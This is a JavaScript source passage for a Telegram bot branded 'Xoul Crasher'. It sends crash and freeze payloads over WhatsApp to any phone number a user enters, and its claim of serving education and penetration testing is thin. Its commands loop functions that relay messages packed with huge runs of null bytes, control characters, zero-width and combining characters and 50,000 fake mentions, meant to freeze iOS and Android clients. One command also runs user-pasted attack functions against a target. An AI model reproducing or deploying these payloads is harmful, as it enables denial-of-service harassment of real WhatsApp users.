<tg-emoji emoji-id="5796440171364749940">📌</tg-emoji> 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙎𝙄 - 𝙎𝘾𝙍𝙄𝙋𝙏 
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝚂𝙲𝚁𝙸𝙿𝚃 𝙽𝙰𝙼𝙴 : 𝗫𝗼𝘂𝗹 𝗖𝗿𝗮𝘀𝗵𝗲𝗿 
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 7.0 
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 : @fuckyoubre
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝙰𝙺𝚂𝙴𝚂 𝙼𝙾𝙳𝙴 : 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎

<tg-emoji emoji-id="4936296803390718929">👾</tg-emoji> このスクリプトをご利用いただきありがとうございます。責任を持ってご使用ください。法律に基づき罰則の対象となる場合がありますので、悪用はお控えください。</blockquote>
<blockquote>──────────────────────────
#- ⌜ 𝗠𝗨𝗥𝗕𝗨𝗚 𝗠𝗢𝗗𝗘 ⌟
┊✦ /MurbugX - Khusus Murbug v1
┊✦ /MurbugV - Khusus Murbug v2
──────────────────────────</blockquote>`;

    const keyboard = [
        [
            {
                text: "𝗕𝗔𝗖𝗞 𝗠𝗘𝗡𝗨",
                callback_data: "/start", style: "primary", icon_custom_emoji_id: "5832251986635920010"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});


bot.action('/about', async (ctx) => {
    const bugMenu = `<blockquote><tg-emoji emoji-id="5357449287707942316">🎁</tg-emoji> 𝗫𝗼𝘂𝗹 𝗖𝗿𝗮𝘀𝗵𝗲𝗿 <tg-emoji emoji-id="5881702736843511327">⚠️</tg-emoji>
 このスクリプトはユーザーと標的の両方にとって非常に危険なので、慎重に使用してください。

<tg-emoji emoji-id="5796440171364749940">📌</tg-emoji> 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙎𝙄 - 𝙎𝘾𝙍𝙄𝙋𝙏 
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝚂𝙲𝚁𝙸𝙿𝚃 𝙽𝙰𝙼𝙴 : 𝗫𝗼𝘂𝗹 𝗖𝗿𝗮𝘀𝗵𝗲𝗿 
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 7.0 
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 : @fuckyoubre
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝙰𝙺𝚂𝙴𝚂 𝙼𝙾𝙳𝙴 : 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎

<tg-emoji emoji-id="4936296803390718929">👾</tg-emoji> このスクリプトをご利用いただきありがとうございます。責任を持ってご使用ください。法律に基づき罰則の対象となる場合がありますので、悪用はお控えください。</blockquote>
<blockquote>──────────────────────────
#- ⌜ 𝗞𝗘𝗧𝗘𝗥𝗔𝗡𝗚𝗔𝗡 ⌟
✦ Script ini dibuat untuk tujuan 𝗲𝗱𝘂𝗰𝗮𝘁𝗶𝗼𝗻𝗮𝗹 & 𝗽𝗲𝗻𝗲𝘁𝗿𝗮𝘁𝗶𝗼𝗻 𝘁𝗲𝘀𝘁𝗶𝗻𝗴 𝗼𝗻𝗹𝘆.
Fungsinya untuk menguji keamanan struktur pesan pada WhatsApp (WA Bot)
dengan sistem payload “bug message”, spam stabil, dan exploit verifikasi
struktur JSON/Protobuf.

✦ Disclaimer :
Creator tidak bertanggung jawab atas penyalahgunaan script ini.
Gunakan untuk memberantas ripper atau scammer di whatsapp,
dan bukan untuk merusak sistem atau mengganggu pengguna lain.
© 2026 - 2027 @fuckyoubre | All Rights Reserved
──────────────────────────</blockquote>`;

    const keyboard = [
        [
            {
                text: "𝗕𝗔𝗖𝗞 𝗠𝗘𝗡𝗨",
                callback_data: "/start", style: "primary", icon_custom_emoji_id: "5832251986635920010"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

// CASE MURBUG DISINI \\
bot.command("MurbugX", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /MurbugX 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `<blockquote>#- 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘚 𝘚 𝘐 𝘖 𝘕 𝘚
╰➤ Exploit Proses Kirim...

 ▢ Target: ${q}
 ▢ Status: Process
 ▢ Type: MurbugX
</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 5; i++) {
    await DelayInsibleNewVnX(target);
    await VnXDelayNewFree(sock, target);
    await VnXNewdelayInvisBulanJuli(target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `<blockquote>#- 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘚 𝘚 𝘐 𝘖 𝘕 𝘚
╰➤ Exploit Berhasil Terkirim...

 ▢ Target: ${q}
 ▢ Status: Success
 ▢ Type: MurbugX
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });
});

bot.command("MurbugV", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /MurbugV 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `<blockquote>#- 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘚 𝘚 𝘐 𝘖 𝘕 𝘚
╰➤ Exploit Proses Kirim...

 ▢ Target: ${q}
 ▢ Status: Process
 ▢ Type: MurbugV
</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 15; i++) {
    await DelayInsibleNewVnX(target);
    await VnXDelayNewFree(sock, target);
    await VnXNewdelayInvisBulanJuli(target);
    await VnXInvisible(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `<blockquote>#- 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘚 𝘚 𝘐 𝘖 𝘕 𝘚
╰➤ Exploit Berhasil Terkirim...

 ▢ Target: ${q}
 ▢ Status: Success
 ▢ Type: MurbugV
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });
});

//CASE BUG DISINI \\
bot.command("blankklik", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /blankklik 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `<blockquote>#- 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘚 𝘚 𝘐 𝘖 𝘕 𝘚
╰➤ Exploit Proses Kirim...

 ▢ Target: ${q}
 ▢ Status: Process
 ▢ Type: blankklik
</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 15; i++) {
    await BlankVnX(target);
    await VnXBlankUiLocaButtons(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `<blockquote>#- 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘚 𝘚 𝘐 𝘖 𝘕 𝘚
╰➤ Exploit Berhasil Terkirim...

 ▢ Target: ${q}
 ▢ Status: Success
 ▢ Type: blankklik
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });
});

bot.command("iosfrez", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /iosfrez 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `<blockquote>#- 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘚 𝘚 𝘐 𝘖 𝘕 𝘚
╰➤ Exploit Proses Kirim...

 ▢ Target: ${q}
 ▢ Status: Process
 ▢ Type: iosfrez
</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 15; i++) {
    await VnXNewFrezeeIosSw(sock, target);
    await VnXNewFrezeeIosSw(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `<blockquote>#- 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘚 𝘚 𝘐 𝘖 𝘕 𝘚
╰➤ Exploit Berhasil Terkirim...

 ▢ Target: ${q}
 ▢ Status: Success
 ▢ Type: iosfrez
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });
});


bot.command("androfrez", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /androfrez 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `<blockquote>#- 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘚 𝘚 𝘐 𝘖 𝘕 𝘚
╰➤ Exploit Proses Kirim...

 ▢ Target: ${q}
 ▢ Status: Process
 ▢ Type: androfrez
</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 10; i++) {
    await VnXNewFrezeeSw(target);
    await sleep(1000);
    await VnXLocationNew(target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `<blockquote>#- 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘚 𝘚 𝘐 𝘖 𝘕 𝘚
╰➤ Exploit Berhasil Terkirim...

 ▢ Target: ${q}
 ▢ Status: Success
 ▢ Type: androfrez
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });
});

bot.command("Delayhard", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /Delayhard 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `<blockquote>#- 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘚 𝘚 𝘐 𝘖 𝘕 𝘚
╰➤ Exploit Proses Kirim...

 ▢ Target: ${q}
 ▢ Status: Process
 ▢ Type: Delayhard
</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 15; i++) {
    await VnXDelayNewFree(target);
    await DelayInsibleNewVnX(target);
    await VnXNewdelayInvisBulanJuli(sock, target);
    await VnXInvisible(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `<blockquote>#- 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘚 𝘚 𝘐 𝘖 𝘕 𝘚
╰➤ Exploit Berhasil Terkirim...

 ▢ Target: ${q}
 ▢ Status: Success
 ▢ Type: Delayhard
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });
});

bot.command("testfunction", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
    try {
      const args = ctx.message.text.split(" ")
      if (args.length < 3)
        return ctx.reply("🪧 ☇ Format: /testfunction 62××× 10 (reply function)")

      const q = args[1]
      const jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 1000))
      if (isNaN(jumlah) || jumlah <= 0)
        return ctx.reply("❌ ☇ Jumlah harus angka")

      const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
      if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.text)
        return ctx.reply("❌ ☇ Reply dengan function")

      const processMsg = await ctx.telegram.sendPhoto(
        ctx.chat.id,
        { url: thumbnailUrl },
        {
          caption: `<blockquote>#- 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘚 𝘚 𝘐 𝘖 𝘕 𝘚
╰➤ Exploit Proses Kirim...

 ▢ Target: ${q}
 ▢ Status: Process
 ▢ Type: Unknown Exploit
</blockquote>`,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }]
            ]
          }
        }
      )
      const processMessageId = processMsg.message_id

      const safeSock = createSafeSock(sock)
      const funcCode = ctx.message.reply_to_message.text
      const match = funcCode.match(/async function\s+(\w+)/)
      if (!match) return ctx.reply("❌ ☇ Function tidak valid")
      const funcName = match[1]

      const sandbox = {
        console,
        Buffer,
        sock: safeSock,
        target,
        sleep,
        generateWAMessageFromContent,
        generateForwardMessageContent,
        generateWAMessage,
        prepareWAMessageMedia,
        proto,
        jidDecode,
        areJidsSameUser
      }
      const context = vm.createContext(sandbox)

      const wrapper = `${funcCode}\n${funcName}`
      const fn = vm.runInContext(wrapper, context)

      for (let i = 0; i < jumlah; i++) {
        try {
          const arity = fn.length
          if (arity === 1) {
            await fn(target)
          } else if (arity === 2) {
            await fn(safeSock, target)
          } else {
            await fn(safeSock, target, true)
          }
        } catch (err) {}
        await sleep(200)
      }

      const finalText = `<blockquote>#- 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘚 𝘚 𝘐 𝘖 𝘕 𝘚
╰➤ Exploit Berhasil Terkirim...

 ▢ Target: ${q}
 ▢ Status: Success
 ▢ Type: Unknown Exploit
</blockquote>`;
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          processMessageId,
          undefined,
          finalText,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }]
              ]
            }
          }
        )
      } catch (e) {
        await ctx.replyWithPhoto(
          { url: thumbnailUrl },
          {
            caption: finalText,
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }]
              ]
            }
          }
        )
      }
    } catch (err) {}
  }
)



//FUNC AMPAS LO TARO DISINI
async function VnXNewFrezeeIosSw(sock, target) {
  for (let v = 0; v < 150; v++) {
    let VnXIosMsg = {
      locationMessage: {
        name: "Hallo" + "𑇂𑆵𑆴𑆿".repeat(250000),
        address: "𑇂𑆵𑆴𑆿".repeat(150000)
      }
    };

    await sock.relayMessage("status@broadcast", VnXIosMsg, {
      messageId: null,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined }
              ]
            }
          ]
        }
      ]
    });
  }
}

async function VnXDelayNewFree(sock, target) {
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "QIFF NOT PAS"
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "\u0000".repeat(250000),
              },
              {
                name: "\n".repeat(250000), 
              }, 
              {
                name: "\0".repeat(25000), 
              }, 
              {
                name: "\x10".repeat(250000)
              }
            ]
          }
        }
      }
    }
  }, {
    participant: { jid: target }
  });
}

async function DelayInsibleNewVnX(sock, target) {
  const msg = {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Qiff Here",
            footer: "By Xoul",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(455000),
            version: 3,
            entryPointConversionSource: "galaxy_message"
          }
        }
      }
    }
  };

  const message = {
    ...msg,
    contextInfo: {
      mentionedJid: [
        target,
        ...Array.from({ length: 50000 }, (_, y) => `${1313555000 + y + 1}@s.whatsapp.net`)
      ]
    },
    forwardingScore: 0,
    isForwarded: false,
    font: Math.floor(Math.random() * 9),
    background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0")
  };
    
  await sock.relayMessage(target, msg, {
    participant: true
  }); 

  await sock.relayMessage(target, message, {
    participant: true
  });
}

async function VnXNewdelayInvisBulanJuli(sock, target) {
  const vnxjuli = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            title: "\0",
            hasMediaAttachment: false
          },
          body: {
            text: "Xoul Here",
            footer: "By Xoul"
          },
          nativeFlowMessage: {
            buttons: [
           {
             conversation: "\x10".repeat(250000)
           }
          ]
        },
        messageParamsJson: "]}".repeat(10000)
      },
      contextInfo: {
      mentionedJid: [
        target,
        ...Array.from({ length: 50000 }, (_, y) => `${1313555000 + y + 1}@s.whatsapp.net`)
      ]
      }
    }
    }
  };

  await sock.relayMessage(target, vnxjuli, {
    noSelfSync: true
  });
}

async function VnXInvisible(sock, target) {
  await sock.relayMessage(
    target,
    {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            body: {
              text: "Hallo" + "\0",
              footer: "By Xoul"
            },
            nativeFlowMessage: {
              buttons: "[]".repeat(250000)
            }
          },
           messageParamsJson: "]}".repeat(10000),
        }
      }
    },
    {
      participant: true
    }
  );
}

async function VnXBlankUiLocaButtons(sock, target) {
    const vnxhere = {
        interactiveMessage: {
            header: {
                locationMessage: {
                    name: "You my friend" + "\u200E".repeat(250000),
                    address: "By Xoul" + "\u200B".repeat(150000)
                }
            },
            body: {
                text: "Hallo bro" + "𑇂𑆵𑆴𑆿".repeat(250000)
            }
        },
        nativeFlowMessage: {
            buttons: [
                {
                    name: "single_select",
                    buttonParamsJson: "{}"
                },
                {
                    name: "cta_call",
                    buttonParamsJson: JSON.stringify({ 
                        display_text: "ꦽ".repeat(15000) 
                    })
                },
                {
                    name: "cta_copy",
                    buttonParamsJson: JSON.stringify({ 
                        display_text: "hallo" + "\u200E".repeat(15000),
                        copy_code: "hallo"
                    })
                },
                {
                    name: "voice_call",
                    buttonParamsJson: "{}"
                }
            ],
            quotedMessage: {
                requestPaymentMessage: {
                    amount: "IDR",
                    currency: "9999999999999"
                }
            }
        }
    };

    await sock.relayMessage(target, vnxhere, {
        noSelfSync: true
    });
}

async function BlankVnX(sock, target) {
  const vnx = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "Hallo",
            footer: "By Xoul",
          },
          nativeFlowMessage: {
        buttons: [
          {
            name: "quick_reply",
            buttonParamsJson: JSON.stringify({
              display_text: "𑜦𑜠".repeat(15000),
              id: null
            })
          },
          {
            name: "quick_reply",
            buttonParamsJson: JSON.stringify({
              display_text: "𑜦𑜠".repeat(15000),
              id: null
            })
          }
            ]
          }
        }
      }
    }
  };

  const message = {
    ...vnx,
    contextInfo: {
      mentionedJid: [
        target,
        ...Array.from({ length: 50000 }, (_, y) => `${1313555000 + y + 1}@s.whatsapp.net`)
      ]
    }
  };
    
  await sock.relayMessage(target, vnx, {
    noSelfSync: true,
  }); 

  await sock.relayMessage(target, message, {
    noSelfSync: true,
  });
}

async function VnXNewFrezeeSw(sock, target) {
  for (let v = 0; v < 100; v++) {
    let VnXMsg = {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length: 500000 }, () => ({}))
        },
        body: {
          text: "VnX Kill You" + "\x10".repeat(25000),
          footer: "By @Raffioffci5",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          paramsJson: "\u0000".repeat(560000),
          version: 3
        }
      }
    };

    await sock.relayMessage("status@broadcast", VnXMsg, {
      messageId: null,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined }
              ]
            }
          ]
        }
      ]
    });
  }
}

async function VnXLocationNew(sock, target) {
  try {
    let vnxuy = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "/0",
              hasMediaAttachment: true,
              locationMessage: {
                name: "Hallo" + "\x10".repeat(250000),
                address: "By Xoul" + "\u0000".repeat(150000),
              },
            },
            body: {
              text: "Hayyy",
              footer: "Heyy"
            },
            nativeFlowMessage: {
              buttons: "\n".repeat(250000),
              messageParamsJson: "{".repeat(15000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: [
                target,
                ...Array.from({ length: 50000 }, (_, y) => `${1313555000 + y + 1}@s.whatsapp.net`)
              ]
            }
          }
        }
      }
    };

  await sock.relayMessage(target, vnxuy);
  } catch (error) {
    console.error("Error Jir:", error);
  }
}

async function VnXNewFrezeeSw(sock, target) {
  for (let v = 0; v < 100; v++) {
    let VnXMsg = {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length: 500000 }, () => ({}))
        },
        body: {
          text: "Hallo" + "\x10".repeat(25000),
          footer: "By Xoul",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          paramsJson: "\u0000".repeat(560000),
          version: 3
        }
      }
    };

    await sock.relayMessage("status@broadcast", VnXMsg, {
      messageId: null,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined }
              ]
            }
          ]
        }
      ]
    });
  }
}


//


bot.launch()
